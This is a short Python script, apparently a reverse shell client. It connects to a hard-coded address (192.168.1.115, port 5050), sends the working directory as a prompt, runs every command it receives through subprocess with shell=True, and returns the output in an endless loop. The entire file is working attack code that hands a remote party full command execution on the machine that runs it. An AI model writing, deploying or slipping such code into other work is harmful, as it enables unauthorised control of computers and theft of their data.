from socket import *
import subprocess
import os

s = socket(AF_INET, SOCK_STREAM)
s.connect(("192.168.1.115",5050))

while True:

    oser = os.getcwd()+"> "
    encoded_oser = oser.encode('utf-8')
    s.sendall(encoded_oser)
    data = (s.recv(1024)).decode('utf-8')
    shell_data = subprocess.Popen(data,shell=True , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

    value_shell = shell_data.stdout.read()+shell_data.stderr.read()

    s.sendall(value_shell)

s.close()